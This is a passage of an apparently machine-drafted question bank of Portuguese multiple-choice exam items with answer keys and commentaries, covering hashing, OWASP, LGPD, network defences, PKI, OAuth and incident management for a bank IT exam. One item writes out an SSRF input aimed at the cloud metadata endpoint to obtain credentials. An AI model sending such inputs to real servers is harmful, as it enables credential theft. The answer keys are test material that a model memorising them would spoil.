    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V006",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Funções hash criptográficas",
  "ref_apostila": {
    "modulo": "04",
    "secao": "18",
    "titulo": "Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#18. Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q22",
    "id_pai": "ESP-SEG-0004",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um sistema publica, ao lado de cada arquivo de remessa, o resumo SHA-256 do arquivo em hexadecimal. Sobre esse uso, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "o resumo tem 64 caracteres hexadecimais (256 bits), qualquer alteração no arquivo produz um resumo totalmente diferente, e ele permite verificar a integridade, mas não garante, sozinho, a autoria.",
    "B": "o resumo tem 256 caracteres hexadecimais e permite recuperar o arquivo original.",
    "C": "o SHA-256 é um algoritmo de criptografia simétrica, e o resumo é o arquivo cifrado.",
    "D": "arquivos de tamanhos diferentes geram resumos de tamanhos diferentes.",
    "E": "o resumo garante a confidencialidade do arquivo de remessa."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** SHA-256 gera **256 bits = 64 caracteres hexadecimais**, de tamanho fixo, com efeito avalanche. Serve para verificar **integridade**; como qualquer um pode recalcular o hash, a **autoria** exige assinatura digital ou HMAC com chave.\n\n(B) São 64 caracteres, e o hash não é reversível. (C) Hash não é cifra. (D) O tamanho do resumo é fixo. (E) Hash não dá confidencialidade.\n\nTamanho conferido com `hashlib` em `tools/verificacao/agente4/verif_seg.py`.\n\nRevisar: Apostila 04, §18.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V007",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "OWASP Top 10:2021",
  "ref_apostila": {
    "modulo": "04",
    "secao": "19",
    "titulo": "OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#19. OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q23",
    "id_pai": "ESP-SEG-0005",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma API de importação de comprovantes recebe uma URL informada pelo usuário e baixa o arquivo a partir do servidor. Um atacante informou `http://169.254.169.254/latest/meta-data/` e obteve credenciais do serviço de metadados da nuvem. No OWASP Top 10:2021, edição citada no edital, essa falha corresponde à categoria",
  "imagem": null,
  "alternativas": {
    "A": "A03:2021 – Injection.",
    "B": "A07:2021 – Identification and Authentication Failures.",
    "C": "A06:2021 – Vulnerable and Outdated Components.",
    "D": "A09:2021 – Security Logging and Monitoring Failures.",
    "E": "A10:2021 – Server-Side Request Forgery (SSRF)."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O servidor foi induzido a fazer requisições a destinos escolhidos pelo atacante (inclusive internos): **SSRF**, que na edição 2021 é a categoria **A10**. Defesas: lista de destinos permitidos, bloqueio de faixas internas e de metadados, segmentação.\n\n(A) Injection envolve dados interpretados como comando (SQL, SO, LDAP, XSS). (B) Trata de falhas de autenticação e sessão. (C) Trata de bibliotecas desatualizadas. (D) Trata de ausência de registro e alerta.\n\nObs.: na edição 2025 do OWASP Top 10 (vista na apostila), o SSRF foi absorvido pela categoria A01 Broken Access Control; o edital cobra a edição 2021.\n\nRevisar: Apostila 04, §19.2.",
  "tags": [
    "owasp-2021"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V008",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "OWASP Top 10:2021",
  "ref_apostila": {
    "modulo": "04",
    "secao": "19",
    "titulo": "OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#19. OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q23",
    "id_pai": "ESP-SEG-0005",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma auditoria verificou que um sistema legado armazena as senhas dos clientes com MD5 sem salt e trafega dados de cartão por HTTP sem TLS em uma integração interna. No OWASP Top 10:2021, esses problemas se enquadram principalmente em",
  "imagem": null,
  "alternativas": {
    "A": "A01:2021 – Broken Access Control.",
    "B": "A02:2021 – Cryptographic Failures.",
    "C": "A04:2021 – Insecure Design.",
    "D": "A05:2021 – Security Misconfiguration.",
    "E": "A08:2021 – Software and Data Integrity Failures."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** **A02:2021 – Cryptographic Failures** (antes \"Sensitive Data Exposure\"): algoritmos fracos ou ausentes, senhas sem hash adequado (deveria ser bcrypt, scrypt, Argon2 ou PBKDF2, com salt), dados sensíveis sem TLS.\n\n(A) Trata de usuários agindo fora de suas permissões. (C) Trata de falhas de projeto e ausência de modelagem de ameaças. (D) Trata de configurações inseguras (padrões, mensagens de erro detalhadas, serviços desnecessários). (E) Trata de integridade de software e dados (pipelines, atualizações sem verificação, desserialização insegura).\n\nRevisar: Apostila 04, §19.2.",
  "tags": [
    "owasp-2021"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V009",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "LGPD: agentes de tratamento",
  "ref_apostila": {
    "modulo": "04",
    "secao": "20",
    "titulo": "LGPD – Lei Geral de Proteção de Dados",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#20. LGPD – Lei Geral de Proteção de Dados]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q24",
    "id_pai": "ESP-SEG-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Segundo a LGPD, a pessoa indicada pelo controlador para atuar como canal de comunicação entre o controlador, os titulares dos dados e a autoridade nacional, cuja identidade e informações de contato devem ser divulgadas publicamente, é o",
  "imagem": null,
  "alternativas": {
    "A": "encarregado.",
    "B": "operador.",
    "C": "controlador conjunto.",
    "D": "titular.",
    "E": "suboperador."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **encarregado** (art. 5º, VIII, e art. 41) é o canal de comunicação com titulares e com a autoridade nacional; aceita reclamações, presta esclarecimentos, recebe comunicações da autoridade e orienta funcionários.\n\n(B) Operador trata dados em nome do controlador. (C) Controladores conjuntos decidem juntos sobre o tratamento. (D) Titular é a pessoa natural a quem os dados se referem. (E) Suboperador é contratado pelo operador.\n\nRevisar: Apostila 04, §20.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V010",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "LGPD: bases legais",
  "ref_apostila": {
    "modulo": "04",
    "secao": "20",
    "titulo": "LGPD – Lei Geral de Proteção de Dados",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#20. LGPD – Lei Geral de Proteção de Dados]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Simulado FCC 1 – Q24",
    "id_pai": "ESP-SEG-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco guarda os dados cadastrais e o histórico de operações de um ex-cliente por exigência da regulação do Banco Central e comunica ao COAF operações suspeitas, mesmo sem consentimento do titular. A base legal da LGPD que fundamenta esse tratamento é",
  "imagem": null,
  "alternativas": {
    "A": "o consentimento do titular, colhido na abertura da conta.",
    "B": "o legítimo interesse do controlador.",
    "C": "a proteção do crédito.",
    "D": "a tutela da saúde.",
    "E": "o cumprimento de obrigação legal ou regulatória pelo controlador."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Guardar dados por exigência do Banco Central e comunicar operações suspeitas ao COAF (Lei 9.613/1998) é **cumprimento de obrigação legal ou regulatória** (art. 7º, II), que dispensa consentimento e também autoriza a conservação após o término da relação (art. 16, I).\n\n(A) O consentimento é revogável e não é a base adequada para obrigações legais; não há hierarquia entre bases. (B) Legítimo interesse exige balanceamento e não é o fundamento de uma obrigação legal. (C) Proteção do crédito trata de birôs e análise de crédito. (D) Tutela da saúde é restrita a profissionais e serviços de saúde.\n\nRevisar: Apostila 04, §20.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V011",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Mecanismos de defesa de rede: IDS e IPS",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §17 – Q6",
    "id_pai": "ESP-SEG-0013",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco posicionou um equipamento em linha entre o firewall de borda e a DMZ. Ao identificar, por assinatura, uma tentativa de exploração conhecida contra o servidor web, o equipamento descartou os pacotes e encerrou a sessão, além de gerar o alerta. Trata-se de um",
  "imagem": null,
  "alternativas": {
    "A": "IDS baseado em host (HIDS).",
    "B": "IDS de rede (NIDS) operando por espelhamento de porta.",
    "C": "honeypot.",
    "D": "IPS de rede.",
    "E": "SIEM."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** O **IPS** opera **em linha** e **bloqueia** o tráfego malicioso, além de alertar.\n\n(A) e (B) O IDS detecta e alerta; geralmente recebe cópia do tráfego (espelhamento) e não bloqueia; o HIDS fica no próprio host. (C) Honeypot é isca para atrair atacantes. (E) O SIEM correlaciona logs e eventos; não fica em linha bloqueando pacotes.\n\nRevisar: Apostila 04, §17.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V012",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Mecanismos de defesa de rede: firewall e WAF",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §17 – Q6",
    "id_pai": "ESP-SEG-0013",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "O internet banking recebe tentativas de SQL injection e de XSS em parâmetros das requisições HTTPS. O firewall de rede stateful da borda não as bloqueia, pois as conexões para a porta 443 são legítimas. O controle adicional mais específico para esse cenário é um",
  "imagem": null,
  "alternativas": {
    "A": "WAF (Web Application Firewall) diante da aplicação, inspecionando o conteúdo das requisições HTTP.",
    "B": "firewall de filtragem de pacotes stateless, com regras por IP e porta.",
    "C": "servidor DHCP com reservas.",
    "D": "NAC baseado em 802.1X.",
    "E": "proxy direto (forward) para os funcionários."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **WAF** protege aplicações **web**, inspecionando a camada 7 (parâmetros, cabeçalhos, corpo) contra SQLi, XSS e outros ataques, como o ModSecurity e os WAFs de nuvem. Não substitui o código seguro.\n\n(B) Filtragem por IP e porta não vê o conteúdo HTTP. (C) DHCP distribui endereços. (D) NAC controla a admissão de dispositivos na rede interna. (E) Proxy direto atende os usuários internos, não protege o servidor.\n\nRevisar: Apostila 04, §17.8.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V013",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Backup e recuperação",
  "ref_apostila": {
    "modulo": "04",
    "secao": "17",
    "titulo": "Segurança: princípios, vulnerabilidades e ataques",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#17. Segurança: princípios, vulnerabilidades e ataques]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §17 – Q5",
    "id_pai": "ESP-SEG-0012",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma política faz backup completo aos domingos e backups incrementais de segunda a sábado, ao fim de cada dia. Um ransomware cifrou o servidor na sexta-feira à tarde, antes do backup do dia. Para restaurar a situação mais recente possível, serão necessários",
  "imagem": null,
  "alternativas": {
    "A": "apenas o backup completo de domingo.",
    "B": "o backup completo de domingo e o incremental de quinta-feira.",
    "C": "o backup completo de domingo e os incrementais de segunda, terça, quarta e quinta-feira.",
    "D": "apenas os incrementais de segunda a quinta-feira.",
    "E": "o backup completo de domingo e o incremental de sexta-feira."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **incremental** copia o que mudou desde o **último backup de qualquer tipo**; por isso a restauração exige o último completo **e todos os incrementais** da sequência: domingo + segunda, terça, quarta e quinta (5 conjuntos).\n\n(A) Perderia quatro dias. (B) Seria suficiente com backups **diferenciais**. (D) Sem o completo, os incrementais não bastam. (E) O backup de sexta não chegou a ser feito.\n\nSequência conferida em `tools/verificacao/agente4/verif_seg.py`.\n\nRevisar: Apostila 04, §17.8.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V014",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Criptografia simétrica e assimétrica",
  "ref_apostila": {
    "modulo": "04",
    "secao": "18",
    "titulo": "Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#18. Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §18 – Q1",
    "id_pai": "ESP-SEG-0014",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma conexão HTTPS com TLS, a criptografia assimétrica e a simétrica são usadas de forma combinada. É correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "todo o tráfego da sessão é cifrado com RSA, pois a criptografia simétrica é insegura.",
    "B": "a criptografia assimétrica (e a troca de chaves Diffie-Hellman) é usada para autenticar o servidor e estabelecer uma chave de sessão, e os dados são cifrados com algoritmo simétrico, como o AES.",
    "C": "o servidor envia sua chave privada ao navegador para que ele decifre as respostas.",
    "D": "a chave de sessão é a própria chave pública do certificado do servidor.",
    "E": "o TLS dispensa certificados quando usa criptografia simétrica."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** É o esquema **híbrido**: o assimétrico (certificado do servidor, assinaturas e troca de chaves por Diffie-Hellman efêmero) autentica e estabelece a **chave de sessão**; os dados seguem cifrados com algoritmo **simétrico** (AES-GCM, ChaCha20), muito mais rápido.\n\n(A) Cifrar todo o tráfego com RSA seria lento; o simétrico não é inseguro. (C) A chave privada nunca sai do servidor. (D) A chave de sessão é simétrica e efêmera. (E) O certificado continua sendo usado para autenticar o servidor.\n\nRevisar: Apostila 04, §18.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V015",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Certificado digital e ICP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "18",
    "titulo": "Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#18. Criptografia, hash, assinatura digital e certificação digital (ICP-Brasil)]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §18 – Q6",
    "id_pai": "ESP-SEG-0019",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "O token com o certificado A3 de um diretor foi furtado e a autoridade certificadora revogou o certificado. Para que os sistemas que recebem documentos assinados verifiquem, no momento da validação, que esse certificado não é mais válido, eles devem consultar",
  "imagem": null,
  "alternativas": {
    "A": "a Lista de Certificados Revogados (LCR) publicada pela AC ou o serviço OCSP.",
    "B": "a data de validade impressa no certificado, que é alterada automaticamente pela AC.",
    "C": "a cadeia de certificação até a AC Raiz, que é suficiente para detectar a revogação.",
    "D": "a Autoridade de Registro que identificou o titular.",
    "E": "o hash do documento assinado."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** A revogação é verificada na **LCR** (CRL), assinada e publicada pela AC, ou de forma online pelo **OCSP**.\n\n(C) A cadeia de certificação prova a emissão por AC confiável, não informa revogação. (B) O certificado é assinado e não é alterado; a validade original continua lá. (D) A AR identifica solicitantes; quem revoga e publica a LCR é a AC. (E) O hash do documento verifica a integridade do conteúdo.\n\nRevisar: Apostila 04, §18.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V016",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "IAM, SSO, OAuth 2.0 e OpenID Connect",
  "ref_apostila": {
    "modulo": "04",
    "secao": "19",
    "titulo": "OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#19. OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §19 – Q4",
    "id_pai": "ESP-SEG-0023",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco quer oferecer login único (SSO) aos seus aplicativos, de modo que cada aplicação receba, após a autenticação no provedor de identidade corporativo, um token com informações sobre quem é o usuário autenticado. Sobre o uso de OAuth 2.0 e OpenID Connect (OIDC), é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "o OAuth 2.0, sozinho, é um protocolo de autenticação que define o ID Token.",
    "B": "o fluxo Implicit é o recomendado pelo OIDC para aplicações móveis.",
    "C": "o access token do OAuth 2.0 é destinado à aplicação cliente para identificar o usuário, e não deve ser enviado à API.",
    "D": "o OIDC substitui o TLS na proteção dos tokens.",
    "E": "o OIDC é uma camada de identidade sobre o OAuth 2.0 que acrescenta o ID Token, um JWT com dados do usuário autenticado, e o endpoint UserInfo."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O **OAuth 2.0** é um framework de **autorização** delegada; para **autenticação** (login, SSO) usa-se o **OpenID Connect**, que acrescenta o **ID Token** (JWT com informações do usuário) e o endpoint UserInfo.\n\n(A) O OAuth 2.0 não define o ID Token nem é protocolo de autenticação. (C) O access token é apresentado à **API** (resource server) e carrega escopos. (D) TLS continua obrigatório. (B) O Implicit é desaconselhado; recomenda-se Authorization Code com PKCE.\n\nRevisar: Apostila 04, §19.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V017",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "IAM, SSO, OAuth 2.0 e OpenID Connect",
  "ref_apostila": {
    "modulo": "04",
    "secao": "19",
    "titulo": "OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#19. OWASP Top 10, OWASP API Security Top 10, testes de segurança e segurança de APIs]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §19 – Q4",
    "id_pai": "ESP-SEG-0023",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um aplicativo móvel de um banco, que não consegue guardar um segredo de cliente com segurança, precisa obter tokens OAuth 2.0 para acessar a API em nome do usuário, após login e consentimento. O fluxo recomendado é",
  "imagem": null,
  "alternativas": {
    "A": "Client Credentials, com o segredo embutido no aplicativo.",
    "B": "Resource Owner Password Credentials, com o app recebendo usuário e senha.",
    "C": "Implicit, com o token devolvido na URL.",
    "D": "Authorization Code com PKCE.",
    "E": "Device Code, por ser o mais simples para celulares."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Para clientes com usuário — web, mobile, SPA — recomenda-se **Authorization Code + PKCE**: o PKCE impede que um código interceptado seja trocado por tokens, mesmo sem segredo de cliente.\n\n(A) Client Credentials é máquina a máquina, sem usuário, e um segredo embutido no app é extraível. (B) Password expõe a senha ao cliente e é desaconselhado. (C) Implicit expõe tokens e foi removido no OAuth 2.1. (E) Device Code é para dispositivos com entrada limitada (TVs, CLIs).\n\nRevisar: Apostila 04, §19.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V018",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Gestão de incidentes: NIST SP 800-61 Rev. 3 e ISO/IEC 27035-1",
  "ref_apostila": {
    "modulo": "04",
    "secao": "21",
    "titulo": "Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#21. Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §21 – Q3",
    "id_pai": "ESP-SEG-0034",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre a NIST SP 800-61 Revisão 3, publicada em abril de 2025, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "mantém o ciclo de quatro fases da revisão anterior: preparação; detecção e análise; contenção, erradicação e recuperação; e atividades pós-incidente.",
    "B": "trata a resposta a incidentes como atividade isolada, separada da gestão de riscos de cibersegurança.",
    "C": "organiza a resposta a incidentes pelas seis funções do NIST CSF 2.0: Governar, Identificar, Proteger, Detectar, Responder e Recuperar.",
    "D": "restringe-se a incidentes em órgãos militares dos Estados Unidos.",
    "E": "substitui a ISO/IEC 27001 como norma certificável de sistemas de gestão."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** A Rev. 3 (abr/2025) substituiu a Rev. 2 e adota as **seis funções do CSF 2.0**: Governar, Identificar e Proteger formam a base de preparação; Detectar, Responder e Recuperar são a resposta.\n\n(A) Descreve a Rev. 2, retirada. (B) A mensagem central é integrar a resposta à **gestão de riscos**. (D) É uma recomendação de aplicação geral. (E) Publicação do NIST não é norma certificável; a ISO/IEC 27001 continua sendo a referência de SGSI.\n\nReferência de data: NIST SP 800-61 Rev. 3, abril de 2025 (vigente em nov/2026).\n\nRevisar: Apostila 04, §21.4.",
  "tags": [
    "datado"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V019",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Gestão de incidentes: NIST SP 800-61 Rev. 3 e ISO/IEC 27035-1",
  "ref_apostila": {
    "modulo": "04",
    "secao": "21",
    "titulo": "Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#21. Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §21 – Q4",
    "id_pai": "ESP-SEG-0035",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Após conter e erradicar um ataque de ransomware e restaurar os serviços, a equipe de resposta do banco fez a análise pós-incidente, identificou a causa raiz (RDP exposto à internet), atualizou os procedimentos e reforçou os controles. Segundo a ABNT NBR ISO/IEC 27035-1:2023, essas atividades pertencem à fase de",
  "imagem": null,
  "alternativas": {
    "A": "planejar e preparar.",
    "B": "detectar e reportar.",
    "C": "avaliar e decidir.",
    "D": "responder.",
    "E": "aprender lições."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** A fase **aprender lições** abrange a análise pós-incidente e a melhoria de controles e processos.\n\n(A) Planejar e preparar define política, equipe, procedimentos e ferramentas antes dos incidentes. (B) Detectar e reportar identifica e comunica eventos. (C) Avaliar e decidir classifica o evento e decide se é incidente. (D) Responder abrange conter, erradicar, recuperar e coletar evidências — etapas já concluídas no cenário.\n\nRevisar: Apostila 04, §21.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SEG-V020",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Segurança da Informação",
  "topico": "Gestão de riscos: ISO/IEC 27005",
  "ref_apostila": {
    "modulo": "04",
    "secao": "21",
    "titulo": "Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#21. Gestão de riscos e incidentes: ISO 31000, ISO/IEC 27005, 27035, NIST SP 800-61r3 e ISO/IEC 27017]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §21 – Q2",
    "id_pai": "ESP-SEG-0033",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para o risco de invasão de contas do internet banking por credenciais vazadas, o banco decidiu implantar autenticação multifator e monitoramento de comportamento, reduzindo a probabilidade de o risco se concretizar. Na ABNT NBR ISO/IEC 27005:2023, essa opção de tratamento é",
  "imagem": null,
  "alternativas": {
    "A": "modificar o risco, aplicando controles.",
    "B": "reter o risco.",
    "C": "evitar o risco.",
    "D": "compartilhar o risco.",
    "E": "transferir o risco ao titular."
  },
  "gabarito": "A",
